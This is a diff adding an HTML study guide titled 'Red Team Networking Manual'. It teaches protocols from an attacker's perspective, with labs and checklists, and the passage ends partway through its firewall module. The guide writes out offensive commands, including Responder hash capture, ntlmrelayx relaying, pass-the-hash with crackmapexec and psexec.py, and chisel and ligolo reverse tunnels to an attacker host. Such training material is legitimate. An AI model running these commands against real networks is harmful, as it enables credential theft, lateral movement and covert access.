@@ -1,0 +1,669 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Red Team Networking Manual</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Exo+2:wght@300;400;600;700&family=Rajdhani:wght@500;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+<style>
+:root{
+--bg:#050810;
+--panel:#0a1020;
+--panel2:#0d1528;
+--cyan:#00d4ff;
+--red:#ff3366;
+--green:#00ff88;
+--orange:#ff8800;
+--purple:#b46cff;
+--text:#c8d8f0;
+--muted:#7d8ca8;
+--border:#16233c;
+}
+*{box-sizing:border-box;scroll-behavior:smooth}
+body{
+margin:0;
+background:var(--bg);
+color:var(--text);
+font-family:'Exo 2',sans-serif;
+overflow-x:hidden;
+}
+body::before{
+content:"";
+position:fixed;
+inset:0;
+pointer-events:none;
+background:repeating-linear-gradient(to bottom,rgba(255,255,255,.02),rgba(255,255,255,.02) 1px,transparent 1px,transparent 3px);
+opacity:.18;
+z-index:999;
+}
+::-webkit-scrollbar{width:10px}
+::-webkit-scrollbar-track{background:#08111f}
+::-webkit-scrollbar-thumb{background:var(--cyan);border-radius:20px}
+.sidebar{
+position:fixed;
+left:0;top:0;
+width:260px;
+height:100vh;
+background:#07101d;
+border-right:1px solid var(--border);
+padding:20px;
+overflow:auto;
+}
+.logo h2{
+font-family:'Rajdhani',sans-serif;
+font-size:2rem;
+line-height:1;
+margin:0;
+color:var(--cyan)
+}
+.logo p{margin:6px 0 20px;color:var(--muted);font-family:'Share Tech Mono',monospace}
+.progress-wrap{margin:20px 0}
+.progress-bar{height:12px;background:#111c31;border-radius:20px;overflow:hidden;border:1px solid #1b3357}
+.progress-fill{height:100%;width:0;background:linear-gradient(90deg,var(--cyan),var(--green));transition:.3s}
+#progressText{font-size:.9rem;margin-top:8px;color:var(--green);font-family:'Share Tech Mono',monospace}
+.nav a{
+display:flex;
+align-items:center;
+gap:10px;
+text-decoration:none;
+color:var(--text);
+padding:10px;
+border-radius:10px;
+margin-bottom:6px;
+transition:.2s;
+font-size:.95rem;
+}
+.nav a:hover{background:#101c33;color:var(--cyan)}
+.dot{width:10px;height:10px;border-radius:50%;background:#2f3f61;transition:.2s}
+.dot.done{background:var(--green);box-shadow:0 0 10px var(--green)}
+main{margin-left:260px;padding:30px}
+.hero{
+padding:40px;
+background:
+linear-gradient(rgba(0,212,255,.05),rgba(0,212,255,.01)),
+linear-gradient(90deg,rgba(255,255,255,.03) 1px,transparent 1px),
+linear-gradient(rgba(255,255,255,.03) 1px,transparent 1px);
+background-size:auto,40px 40px,40px 40px;
+border:1px solid var(--border);
+border-radius:24px;
+position:relative;
+overflow:hidden;
+}
+.hero-tag{color:var(--green);font-family:'Share Tech Mono',monospace;letter-spacing:2px}
+h1{
+font-family:'Rajdhani',sans-serif;
+font-size:4rem;
+margin:10px 0;
+text-transform:uppercase;
+position:relative;
+animation:glitch 3s infinite;
+}
+h1 span{color:var(--cyan)}
+@keyframes glitch{
+0%,100%{text-shadow:2px 0 var(--cyan),-2px 0 var(--red)}
+50%{text-shadow:-3px 0 var(--cyan),3px 0 var(--red)}
+}
+.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:15px;margin-top:25px}
+.stat{background:#091425;border:1px solid var(--border);padding:20px;border-radius:16px}
+.stat h3{margin:0;color:var(--cyan);font-size:2rem;font-family:'Rajdhani'}
+.section-title{margin:40px 0 20px;font-family:'Rajdhani';font-size:2rem;color:var(--cyan)}
+.module{
+background:var(--panel);
+border:1px solid var(--border);
+border-left:4px solid transparent;
+border-radius:18px;
+margin-bottom:20px;
+overflow:hidden;
+transition:.2s;
+}
+.module:hover,.module.open{border-left-color:var(--cyan)}
+.module-header{
+padding:20px;
+display:flex;
+justify-content:space-between;
+align-items:center;
+cursor:pointer;
+}
+.module-header h3{margin:0;font-family:'Rajdhani';font-size:1.8rem}
+.badge{padding:5px 10px;border-radius:20px;background:#11213d;color:var(--cyan);font-size:.8rem;font-family:'Share Tech Mono'}
+.chev{transition:.3s}
+.module.open .chev{transform:rotate(90deg)}
+.module-body{display:none;padding:0 20px 20px}
+.module.open .module-body{display:block}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:20px}
+.ab,.ib,.lb,.wb,.mm{
+padding:18px;
+border-radius:14px;
+margin:18px 0;
+}
+.ab{background:rgba(255,51,102,.08);border-left:4px solid var(--red)}
+.ib{background:rgba(0,212,255,.08);border-left:4px solid var(--cyan)}
+.lb{background:rgba(0,255,136,.08);border-left:4px solid var(--green)}
+.wb{background:rgba(255,136,0,.08);border-left:4px solid var(--orange)}
+.mm{background:rgba(180,108,255,.08);border-left:4px solid var(--purple);font-style:italic}
+.mm strong{display:block;color:var(--purple);margin-bottom:8px}
+.cb,.ascii{
+background:#03060d;
+border:1px solid #18233b;
+border-radius:14px;
+padding:16px;
+overflow:auto;
+font-family:'Share Tech Mono',monospace;
+margin:16px 0;
+}
+.ascii{color:var(--cyan);white-space:pre}
+.cmd{color:var(--cyan)}
+.cmt{color:#7f8ba7}
+.flg{color:var(--orange)}
+.val{color:var(--green)}
+.pth{color:var(--purple)}
+.dtable{width:100%;border-collapse:collapse;margin:20px 0}
+.dtable th,.dtable td{padding:12px;border:1px solid #1a2740}
+.dtable th{background:#111c31;color:var(--cyan);font-family:'Share Tech Mono'}
+.dtable tr:hover{background:#10192b}
+.dtable td:first-child{font-family:'Share Tech Mono';color:var(--cyan)}
+.cl-item{
+display:flex;
+align-items:center;
+gap:12px;
+padding:12px;
+background:#0d1628;
+border:1px solid #16233d;
+border-radius:12px;
+margin:10px 0;
+cursor:pointer;
+}
+.check{
+width:22px;height:22px;border:2px solid var(--cyan);border-radius:6px;display:flex;align-items:center;justify-content:center;font-family:'Share Tech Mono'
+}
+.cl-item.done .check{background:var(--green);border-color:var(--green);color:#000}
+.cl-item.done span:last-child{text-decoration:line-through;color:#7f8ba7}
+.timeline{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:16px}
+.week{background:#0b1528;border:1px solid var(--border);padding:18px;border-radius:16px}
+.week h4{margin-top:0;color:var(--green)}
+.week-grid{display:grid;grid-template-columns:repeat(7,1fr);gap:8px;margin-top:20px}
+.day{background:#0e1b31;padding:10px;border-radius:10px;text-align:center;font-size:.8rem}
+.ports-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:15px}
+.port-card{background:#0c1526;border:1px solid #1b2c4a;padding:15px;border-radius:14px}
+.port-card h4{margin:0;color:var(--cyan);font-family:'Share Tech Mono';font-size:1.6rem}
+.port-card.critical{border-color:rgba(255,51,102,.5);background:rgba(255,51,102,.08)}
+.port-card.critical h4{color:var(--red)}
+.models{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:16px}
+.model-card{background:#130d21;border:1px solid #442d69;padding:18px;border-radius:16px}
+.model-card h4{color:var(--purple);margin-top:0}
+@media(max-width:900px){
+.sidebar{position:relative;width:100%;height:auto}
+main{margin-left:0}
+.grid2,.week-grid{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<div class="sidebar">
+<div class="logo">
+<h2>Red Team Networking</h2>
+<p>v1.0 offensive edition</p>
+</div>
+<div class="progress-wrap">
+<div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+<div id="progressText">0 / 40 tasks completed</div>
+</div>
+<div class="nav">
+<a href="#intro"><span class="dot"></span>Introduction</a>
+<a href="#schedule"><span class="dot"></span>4-Week Schedule</a>
+<a href="#m1"><span class="dot"></span>OSI & TCP/IP</a>
+<a href="#m2"><span class="dot"></span>Subnetting</a>
+<a href="#m3"><span class="dot"></span>TCP & UDP</a>
+<a href="#m4"><span class="dot"></span>DNS</a>
+<a href="#m5"><span class="dot"></span>ARP & Layer 2</a>
+<a href="#m6"><span class="dot"></span>TLS & HTTPS</a>
+<a href="#m7"><span class="dot"></span>HTTP Deep Dive</a>
+<a href="#m8"><span class="dot"></span>SMB & Windows</a>
+<a href="#m9"><span class="dot"></span>Pivoting</a>
+<a href="#m10"><span class="dot"></span>Firewalls</a>
+<a href="#ports"><span class="dot"></span>Port Reference</a>
+<a href="#cheats"><span class="dot"></span>Cheatsheet</a>
+<a href="#mental"><span class="dot"></span>Mental Models</a>
+</div>
+</div>
+<main>
+<section class="hero">
+<div class="hero-tag">Red Team Field Manual — Networking Edition</div>
+<h1>Network Protocols <span>for Attackers</span></h1>
+<p>This manual teaches networking exactly the way offensive operators use it during internal assessments, external attacks, phishing operations, lateral movement, and command-and-control. Every protocol is explained through the lens of attack surface, detection, pivoting, and tradecraft.</p>
+<div class="stats">
+<div class="stat"><h3>10</h3><p>Core Modules</p></div>
+<div class="stat"><h3>4</h3><p>Weeks</p></div>
+<div class="stat"><h3>40+</h3><p>Exercises</p></div>
+<div class="stat"><h3>100%</h3><p>Attack Focused</p></div>
+</div>
+</section>
+
+<h2 class="section-title" id="intro">Section 00 — Introduction</h2>
+<div class="grid2">
+<div class="ib">
+<h3>What This Document Is</h3>
+<p>This guide is a field manual for red teamers. It ignores academic fluff and focuses only on networking concepts that appear during real operations: enumeration, packet analysis, lateral movement, covert communications, pivoting, evasion, and Windows internals. Every protocol is treated as both a communication standard and an attack surface.</p>
+</div>
+<div class="ib">
+<h3>What You Need Before Starting</h3>
+<p>You should know Linux basics, VM networking, and how to install Wireshark. A Kali VM and a Windows VM are highly recommended. Hack The Box, TryHackMe, or a local lab should be used continuously while studying.</p>
+</div>
+</div>
+<div class="wb"><strong>Warning:</strong> Every concept in this guide must be practiced in Wireshark during the same study session. Reading without packet inspection creates fake understanding.</div>
+
+<h2 class="section-title" id="schedule">Section 01 — 4-Week Schedule</h2>
+<div class="timeline">
+<div class="week"><h4>Week 1</h4><p>OSI, TCP/IP, IPv4, subnetting, routing.</p></div>
+<div class="week"><h4>Week 2</h4><p>TCP, UDP, scanning, DNS internals.</p></div>
+<div class="week"><h4>Week 3</h4><p>ARP, Responder, TLS, HTTP.</p></div>
+<div class="week"><h4>Week 4</h4><p>SMB, pivoting, tunneling, firewalls.</p></div>
+</div>
+<div class="week-grid">
+<div class="day">Mon<br>Learn</div>
+<div class="day">Tue<br>Lab</div>
+<div class="day">Wed<br>Learn</div>
+<div class="day">Thu<br>Lab</div>
+<div class="day">Fri<br>Apply (HTB)</div>
+<div class="day">Sat<br>Review (Anki)</div>
+<div class="day">Sun<br>Rest</div>
+</div>
+
+<div class="module" id="m1">
+<div class="module-header"><h3>Module 1 — OSI & TCP/IP Model <span class="badge">Foundation</span></h3><div class="chev">▶</div></div>
+<div class="module-body">
+<p>The TCP/IP model exists because networks require standardized encapsulation. Red teamers use the model as a thinking framework. Every packet is a stack of wrappers and every defensive technology operates at a specific layer. Once you identify the layer, you immediately understand what data is visible, what telemetry exists, and what controls can be bypassed.</p>
+<div class="ascii">+----------------------+----------------------+-------------------+
+| Layer                | Protocols            | Attack Relevance  |
++----------------------+----------------------+-------------------+
+| Application          | HTTP DNS SMB TLS     | Web attacks C2    |
+| Transport            | TCP UDP              | Scanning Evasion  |
+| Internet             | IP ICMP              | Routing Pivoting  |
+| Link                 | Ethernet ARP         | MITM Poisoning    |
++----------------------+----------------------+-------------------+</div>
+<p>PDUs change names while moving down the stack: Application data is a Message, TCP wraps it into a Segment, IP wraps it into a Packet, and Ethernet wraps it into a Frame.</p>
+<div class="ab"><strong>Attack Relevance:</strong> Every attack maps to a layer. ARP poisoning is Layer 2. SYN scans are Layer 4. DNS tunneling is Layer 7. Knowing the layer reveals where defenders inspect traffic.</div>
+<div class="lb"><strong>Lab Exercises</strong><ul><li>Capture a ping in Wireshark.</li><li>Expand Ethernet, IP, and ICMP layers.</li><li>Draw the TCP/IP model from memory.</li><li>Explain which device reads each layer.</li></ul></div>
+<div class="mm"><strong>◈ Mental Model</strong>The TCP/IP model is a stack of wrappers where each layer only trusts the wrapper directly around it.</div>
+<div class="cl-item"><div class="check"></div><span>Captured ICMP traffic in Wireshark</span></div>
+<div class="cl-item"><div class="check"></div><span>Identified all TCP/IP layers manually</span></div>
+<div class="cl-item"><div class="check"></div><span>Mapped attacks to protocol layers</span></div>
+<div class="cl-item"><div class="check"></div><span>Drew packet encapsulation flow</span></div>
+</div></div>
+
+<div class="module" id="m2">
+<div class="module-header"><h3>Module 2 — IP Addressing & Subnetting <span class="badge">Foundation • Core</span></h3><div class="chev">▶</div></div>
+<div class="module-body">
+<p>IPv4 is a 32-bit number split into network and host portions. Subnetting tells devices whether traffic stays local or gets routed. During internal assessments, subnetting exposes hidden segments, VLANs, and pivot opportunities.</p>
+<table class="dtable">
+<tr><th>CIDR</th><th>Mask</th><th>Usable Hosts</th><th>Use Case</th></tr>
+<tr><td>/32</td><td>255.255.255.255</td><td>1</td><td>Single host</td></tr>
+<tr><td>/30</td><td>255.255.255.252</td><td>2</td><td>Point-to-point</td></tr>
+<tr><td>/29</td><td>255.255.255.248</td><td>6</td><td>Small office</td></tr>
+<tr><td>/28</td><td>255.255.255.240</td><td>14</td><td>Lab subnet</td></tr>
+<tr><td>/27</td><td>255.255.255.224</td><td>30</td><td>Department VLAN</td></tr>
+<tr><td>/26</td><td>255.255.255.192</td><td>62</td><td>Medium LAN</td></tr>
+<tr><td>/25</td><td>255.255.255.128</td><td>126</td><td>Corporate floor</td></tr>
+<tr><td>/24</td><td>255.255.255.0</td><td>254</td><td>Most common LAN</td></tr>
+<tr><td>/16</td><td>255.255.0.0</td><td>65534</td><td>Enterprise network</td></tr>
+<tr><td>/8</td><td>255.0.0.0</td><td>16M+</td><td>Massive private range</td></tr>
+</table>
+<p>Private ranges are 10.0.0.0/8, 172.16.0.0/12, and 192.168.0.0/16. After compromise, these ranges often reveal internal infrastructure that cannot be accessed externally.</p>
+<p>Routers inspect destination IPs and consult routing tables. If traffic is outside the local subnet, packets are sent to the default gateway. Pivoting depends on compromised systems that have routes into additional networks.</p>
+<div class="cb"><span class="cmd">ip route</span>            <span class="cmt"># Linux routing table</span>
+<span class="cmd">route -n</span>            <span class="cmt"># Legacy route view</span>
+<span class="cmd">traceroute</span> <span class="val">10.10.10.10</span>
+<span class="cmd">ip addr</span>
+<span class="cmd">arp -a</span></div>
+<div class="ab"><strong>Attack Insight:</strong> Any route entry into another subnet may indicate a dual-homed host suitable for pivoting.</div>
+<div class="lb"><strong>Labs</strong><ul><li>Calculate /27 and /28 ranges by hand.</li><li>Run traceroute while capturing packets.</li><li>Identify the gateway MAC via ARP.</li><li>Map local subnet boundaries.</li></ul></div>
+<div class="mm"><strong>◈ Mental Model</strong>Subnetting is simply determining which traffic stays local and which traffic must ask a router for help.</div>
+<div class="cl-item"><div class="check"></div><span>Calculated subnets manually</span></div>
+<div class="cl-item"><div class="check"></div><span>Read a routing table</span></div>
+<div class="cl-item"><div class="check"></div><span>Captured traceroute packets</span></div>
+<div class="cl-item"><div class="check"></div><span>Identified pivot-worthy networks</span></div>
+</div></div>
+
+<div class="module" id="m3"><div class="module-header"><h3>Module 3 — TCP & UDP <span class="badge">Attack-Critical • Core</span></h3><div class="chev">▶</div></div><div class="module-body">
+<div class="ascii">Client                     Server
+ SYN seq=100  ---------->
+                 <-------- SYN/ACK seq=900 ack=101
+ ACK ack=901 -----------></div>
+<p>TCP creates reliable sessions using sequence numbers, acknowledgements, retransmissions, and flags. SYN scans send only the initial SYN packet and infer port state from the response, making them stealthier than full connect scans that complete the handshake and generate application logs.</p>
+<table class="dtable"><tr><th>Flag</th><th>Purpose</th><th>Attack Use</th></tr>
+<tr><td>SYN</td><td>Start connection</td><td>SYN scanning</td></tr>
+<tr><td>ACK</td><td>Acknowledge data</td><td>Firewall mapping</td></tr>
+<tr><td>RST</td><td>Reset session</td><td>Connection teardown</td></tr>
+<tr><td>FIN</td><td>Finish session</td><td>FIN stealth scans</td></tr>
+<tr><td>PSH</td><td>Push data now</td><td>Traffic analysis</td></tr>
+<tr><td>URG</td><td>Urgent pointer</td><td>Rare anomaly</td></tr>
+<tr><td>NULL</td><td>No flags set</td><td>NULL scan</td></tr>
+<tr><td>XMAS</td><td>FIN+PSH+URG</td><td>IDS evasion</td></tr></table>
+<div class="cb"><span class="cmd">nmap</span> <span class="flg">-sS</span> <span class="val">10.10.10.5</span>   <span class="cmt"># SYN scan</span>
+<span class="cmd">nmap</span> <span class="flg">-sT</span> <span class="val">10.10.10.5</span>   <span class="cmt"># Connect scan</span>
+<span class="cmd">nmap</span> <span class="flg">-sU</span> <span class="val">10.10.10.5</span>   <span class="cmt"># UDP scan</span>
+<span class="cmd">nmap</span> <span class="flg">-sF</span>
+<span class="cmd">nmap</span> <span class="flg">-sN</span>
+<span class="cmd">nmap</span> <span class="flg">-sX</span>
+<span class="cmd">nmap</span> <span class="flg">-A</span></div>
+<p>UDP is connectionless and lacks acknowledgements. This makes it harder to scan reliably but excellent for covert channels. SNMP leaks network data, DNS can carry C2 traffic, and many defenders ignore UDP telemetry.</p>
+<div class="lb"><strong>Labs</strong><ul><li>Capture SYN and connect scans.</li><li>Compare flag behavior.</li><li>Read TCP header fields.</li><li>Observe retransmissions.</li></ul></div>
+<div class="mm"><strong>◈ Mental Model</strong>TCP is a conversation with memory while UDP is a fire-and-forget delivery mechanism.</div>
+<div class="cl-item"><div class="check"></div><span>Captured a SYN scan</span></div>
+<div class="cl-item"><div class="check"></div><span>Compared TCP flags</span></div>
+<div class="cl-item"><div class="check"></div><span>Ran UDP enumeration</span></div>
+<div class="cl-item"><div class="check"></div><span>Read sequence numbers</span></div>
+<div class="cl-item"><div class="check"></div><span>Explained stealth differences</span></div>
+</div></div>
+
+<div class="module" id="m4"><div class="module-header"><h3>Module 4 — DNS <span class="badge">Attack-Critical</span></h3><div class="chev">▶</div></div><div class="module-body">
+<div class="ascii">Stub Resolver -> Root -> TLD -> Authoritative DNS -> Answer</div>
+<table class="dtable"><tr><th>Record</th><th>Purpose</th><th>Offensive Value</th></tr>
+<tr><td>A</td><td>IPv4</td><td>Infrastructure mapping</td></tr>
+<tr><td>AAAA</td><td>IPv6</td><td>IPv6 discovery</td></tr>
+<tr><td>CNAME</td><td>Alias</td><td>CDN identification</td></tr>
+<tr><td>MX</td><td>Mail</td><td>Phishing targeting</td></tr>
+<tr><td>TXT</td><td>Metadata</td><td>SPF secrets</td></tr>
+<tr><td>NS</td><td>Name server</td><td>Zone infrastructure</td></tr>
+<tr><td>PTR</td><td>Reverse lookup</td><td>Internal naming</td></tr>
+<tr><td>SRV</td><td>Service location</td><td>AD enumeration</td></tr>
+<tr><td>SOA</td><td>Authority</td><td>Zone metadata</td></tr></table>
+<div class="cb"><span class="cmd">dig</span> example.com A
+<span class="cmd">dig</span> example.com ANY
+<span class="cmd">dig</span> example.com NS
+<span class="cmd">dig</span> <span class="flg">AXFR</span> @ns1.example.com example.com
+<span class="cmd">dig</span> -x 10.10.10.5
+<span class="cmd">dig</span> _ldap._tcp.dc._msdcs.domain.local SRV
+<span class="cmd">dnsx</span> -d domain.com -w words.txt
+<span class="cmd">amass</span> enum -passive -d domain.com</div>
+<div class="ascii">Beacon -> base64.data.domain.com -> Recursive DNS -> Authoritative C2</div>
+<div class="ab"><strong>Detection:</strong> Defenders look for long labels, high entropy subdomains, TXT abuse, unusual query frequency, and rare domains.</div>
+<div class="mm"><strong>◈ Mental Model</strong>DNS is both the internet's phonebook and one of the stealthiest covert channels available.</div>
+<div class="cl-item"><div class="check"></div><span>Queried DNS record types</span></div>
+<div class="cl-item"><div class="check"></div><span>Attempted AXFR transfer</span></div>
+<div class="cl-item"><div class="check"></div><span>Enumerated AD SRV records</span></div>
+<div class="cl-item"><div class="check"></div><span>Observed recursive resolution</span></div>
+<div class="cl-item"><div class="check"></div><span>Explained DNS C2 detection</span></div>
+</div></div>
+
+<div class="module" id="m5"><div class="module-header"><h3>Module 5 — ARP & Layer 2 <span class="badge">Attack-Critical</span></h3><div class="chev">▶</div></div><div class="module-body">
+<div class="ascii">NORMAL:
+Victim -> Who has gateway?
+Gateway -> I am gateway
+
+POISONED:
+Victim -> Who has gateway?
+Attacker -> I am gateway
+Victim traffic now flows through attacker</div>
+<p>ARP has no authentication. Any device can claim to own any IP. This design flaw enables machine-in-the-middle attacks inside local networks.</p>
+<p>Bettercap and Ettercap automate ARP poisoning. LLMNR and NBT-NS exist because Windows tries fallback name resolution when DNS fails. Responder abuses this behavior to capture NetNTLMv2 challenge-response hashes.</p>
+<div class="cb"><span class="cmd">responder</span> <span class="flg">-I</span> eth0 -wrf
+<span class="cmd">hashcat</span> <span class="flg">-m</span> 5600 hashes.txt rockyou.txt
+<span class="cmd">ntlmrelayx.py</span> -tf targets.txt -smb2support</div>
+<div class="lb"><strong>Lab</strong><p>Place Kali and Windows on the same network. Run Responder. On Windows access \\nonexistent. Capture the NetNTLMv2 hash and crack it.</p></div>
+<div class="mm"><strong>◈ Mental Model</strong>Layer 2 attacks succeed because local networks trust whoever answers first.</div>
+<div class="cl-item"><div class="check"></div><span>Observed ARP traffic</span></div>
+<div class="cl-item"><div class="check"></div><span>Captured NetNTLMv2 hash</span></div>
+<div class="cl-item"><div class="check"></div><span>Ran Responder successfully</span></div>
+<div class="cl-item"><div class="check"></div><span>Explained ARP poisoning flow</span></div>
+</div></div>
+
+<div class="module" id="m6"><div class="module-header"><h3>Module 6 — TLS & HTTPS <span class="badge">Core • C2-Relevant</span></h3><div class="chev">▶</div></div><div class="module-body">
+<div class="ascii">ClientHello -> Cipher Suites + SNI
+ServerHello -> Selected Cipher
+Certificate Exchange
+ChangeCipherSpec
+Encrypted Application Data</div>
+<p>TLS encrypts payloads but does not hide everything. Destination IPs, packet timing, TLS fingerprints, and often the SNI hostname remain visible.</p>
+<div class="ab"><strong>Critical:</strong> TLS does NOT hide destination IP, SNI fields, timing patterns, or JA3 fingerprints.</div>
+<p>JA3 fingerprinting hashes TLS cipher suites and extensions to uniquely identify TLS libraries. EDRs compare these hashes against known malware frameworks. Malleable C2 profiles imitate Chrome or Firefox to blend in.</p>
+<p>Certificates expose Common Names, SANs, issuers, and validity periods even without decryption. Suspicious domain age or self-signed certs trigger detections.</p>
+<div class="cb">tls.handshake.type == 1   <span class="cmt"># ClientHello filter</span>
+Expand: TLS -> Extensions -> Server Name
+Read plaintext SNI field</div>
+<div class="mm"><strong>◈ Mental Model</strong>TLS hides the message body, not the fact that the conversation exists.</div>
+<div class="cl-item"><div class="check"></div><span>Captured TLS handshake</span></div>
+<div class="cl-item"><div class="check"></div><span>Read SNI field</span></div>
+<div class="cl-item"><div class="check"></div><span>Explained JA3 fingerprinting</span></div>
+<div class="cl-item"><div class="check"></div><span>Inspected certificate metadata</span></div>
+</div></div>
+
+<div class="module" id="m7"><div class="module-header"><h3>Module 7 — HTTP Deep Dive <span class="badge">Attack-Critical</span></h3><div class="chev">▶</div></div><div class="module-body">
+<div class="cb">POST /login HTTP/1.1
+Host: target.local              # virtual host routing
+User-Agent: Mozilla/5.0
+Content-Type: application/json
+Authorization: Bearer eyJ...
+Origin: https://evil.com
+Content-Length: 55
+
+{"user":"admin","pass":"password"}</div>
+<table class="dtable"><tr><th>Method</th><th>Purpose</th><th>Attack Relevance</th></tr>
+<tr><td>GET</td><td>Read data</td><td>Recon</td></tr>
+<tr><td>POST</td><td>Submit data</td><td>Auth brute force</td></tr>
+<tr><td>PUT</td><td>Upload</td><td>Web shell upload</td></tr>
+<tr><td>PATCH</td><td>Partial modify</td><td>API abuse</td></tr>
+<tr><td>DELETE</td><td>Remove resource</td><td>Authorization bypass</td></tr>
+<tr><td>OPTIONS</td><td>Capabilities</td><td>CORS recon</td></tr>
+<tr><td>HEAD</td><td>Headers only</td><td>Silent recon</td></tr>
+<tr><td>TRACE</td><td>Echo request</td><td>XST attacks</td></tr></table>
+<div class="ab"><strong>Header Abuse</strong><ul><li><strong>Host:</strong> vhost bypass, password reset poisoning, cache poisoning.</li><li><strong>X-Forwarded-For:</strong> bypass IP restrictions using 127.0.0.1.</li><li><strong>Content-Type:</strong> switch to text/xml for XXE.</li><li><strong>Origin:</strong> exploit CORS trust relationships.</li><li><strong>Authorization Bearer:</strong> decode JWTs, alg:none bypass, RS256→HS256 confusion.</li></ul></div>
+<div class="cb"><span class="cmd">curl</span> -v https://target
+<span class="cmd">curl</span> -H <span class="val">"Host: admin.target"</span>
+<span class="cmd">curl</span> -H <span class="val">"X-Forwarded-For: 127.0.0.1"</span>
+<span class="cmd">curl</span> -H <span class="val">"Origin: https://evil.com"</span>
+<span class="cmd">jwt-tool</span> token.txt
+<span class="cmd">curl</span> -X OPTIONS https://target/api</div>
+<table class="dtable"><tr><th>Code</th><th>Meaning</th><th>Recon Value</th></tr>
+<tr><td>200</td><td>OK</td><td>Resource exists</td></tr>
+<tr><td>301/302</td><td>Redirect</td><td>Routing discovery</td></tr>
+<tr><td>400</td><td>Bad request</td><td>Parser clues</td></tr>
+<tr><td>401</td><td>Unauthorized</td><td>Authentication exists</td></tr>
+<tr><td>403</td><td>Forbidden</td><td>Potential bypass target</td></tr>
+<tr><td>404</td><td>Not found</td><td>Enumeration feedback</td></tr>
+<tr><td>405</td><td>Method blocked</td><td>Method probing</td></tr>
+<tr><td>500</td><td>Server error</td><td>Code execution hints</td></tr>
+<tr><td>502/503</td><td>Upstream failure</td><td>Proxy architecture</td></tr></table>
+<div class="mm"><strong>◈ Mental Model</strong>HTTP attacks often succeed because servers trust headers that clients fully control.</div>
+<div class="cl-item"><div class="check"></div><span>Modified HTTP headers</span></div>
+<div class="cl-item"><div class="check"></div><span>Decoded a JWT</span></div>
+<div class="cl-item"><div class="check"></div><span>Captured raw requests</span></div>
+<div class="cl-item"><div class="check"></div><span>Enumerated methods</span></div>
+<div class="cl-item"><div class="check"></div><span>Explained response code recon</span></div>
+</div></div>
+
+<div class="module" id="m8"><div class="module-header"><h3>Module 8 — SMB & Windows Networking <span class="badge">Attack-Critical • AD-Core</span></h3><div class="chev">▶</div></div><div class="module-body">
+<p>SMB powers Windows file sharing and nearly all lateral movement. Port 445 is one of the most important ports in enterprise environments.</p>
+<p>PsExec uploads a service binary over SMB, creates a temporary Windows service, executes commands remotely, and generates Event IDs 4624 and 7045.</p>
+<p>SMB signing prevents tampering. Domain controllers usually require it while workstations often do not, enabling SMB relay attacks.</p>
+<div class="ascii">Client -> Server: Username
+Server -> Client: Challenge
+Client -> Server: HMAC(challenge, NT hash)
+Server verifies using stored NT hash</div>
+<div class="ib"><strong>Key Insight:</strong> The NT hash IS the credential. Plaintext passwords are not transmitted after setup.</div>
+<p>Pass-the-Hash authenticates using NTLM hashes directly. Pass-the-Ticket reuses Kerberos tickets.</p>
+<div class="ab"><strong>Detection:</strong> Event 4624 LogonType 3 with NtLmSsp from unusual systems may indicate lateral movement.</div>
+<div class="cb"><span class="cmd">crackmapexec smb</span> 10.10.10.0/24
+<span class="cmd">crackmapexec smb</span> target -u admin -H HASH
+<span class="cmd">psexec.py</span> domain/user@target -hashes LM:NT
+<span class="cmd">wmiexec.py</span> domain/user@target
+<span class="cmd">evil-winrm</span> -i target -u user -H HASH</div>
+<div class="mm"><strong>◈ Mental Model</strong>In Windows networks, possession of the hash often matters more than knowing the password.</div>
+<div class="cl-item"><div class="check"></div><span>Enumerated SMB shares</span></div>
+<div class="cl-item"><div class="check"></div><span>Explained NTLM challenge flow</span></div>
+<div class="cl-item"><div class="check"></div><span>Tested PtH authentication</span></div>
+<div class="cl-item"><div class="check"></div><span>Reviewed SMB signing</span></div>
+</div></div>
+
+<div class="module" id="m9"><div class="module-header"><h3>Module 9 — Pivoting & Tunneling <span class="badge">Advanced • Core</span></h3><div class="chev">▶</div></div><div class="module-body">
+<div class="ascii">Internet -> Kali -> Dual-Homed Web Server -> Internal DC + DB</div>
+<p>Pivoting means using one compromised host to reach another network segment. Dual-homed hosts are ideal pivots because they connect to multiple networks.</p>
+<p>SSH Local Port Forward exposes remote services locally. Dynamic forwarding creates a SOCKS proxy. Remote forwarding exposes attacker services to the victim side.</p>
+<div class="cb"><span class="cmd">ssh</span> -L 8080:internal:80 user@pivot
+<span class="cmd">ssh</span> -D 1080 user@pivot
+<span class="cmd">ssh</span> -R 4444:localhost:4444 user@pivot</div>
+<p>Chisel creates HTTP-based tunnels while Ligolo-ng creates a TUN interface that supports raw sockets and native tooling.</p>
+<div class="cb"><span class="cmd">chisel server</span> --reverse -p 8000
+<span class="cmd">chisel client</span> attacker:8000 R:socks
+<span class="cmd">ligolo-proxy</span> -selfcert
+<span class="cmd">ligolo-agent</span> -connect attacker:11601</div>
+<div class="wb"><strong>Warning:</strong> proxychains does not support raw sockets. Use <code>-sT -Pn</code> with nmap through SOCKS proxies.</div>
+<div class="mm"><strong>◈ Mental Model</strong>Pivoting turns one foothold into a transit gateway for entire hidden networks.</div>
+<div class="cl-item"><div class="check"></div><span>Created SSH SOCKS proxy</span></div>
+<div class="cl-item"><div class="check"></div><span>Used proxychains</span></div>
+<div class="cl-item"><div class="check"></div><span>Configured Chisel tunnel</span></div>
+<div class="cl-item"><div class="check"></div><span>Explained Ligolo advantages</span></div>
+</div></div>
+
+<div class="module" id="m10"><div class="module-header"><h3>Module 10 — Firewalls, NAT & Detection Evasion <span class="badge">Advanced</span></h3><div class="chev">▶</div></div><div class="module-body">
+<p>Stateful firewalls track connections while stateless firewalls only inspect packets individually. Enterprises usually allow outbound traffic while blocking unsolicited inbound traffic.</p>
+<div class="ab"><strong>Fundamental Asymmetry:</strong> Firewalls block inbound traffic but allow outbound traffic. That is why almost every C2 framework uses outbound beaconing.</div>
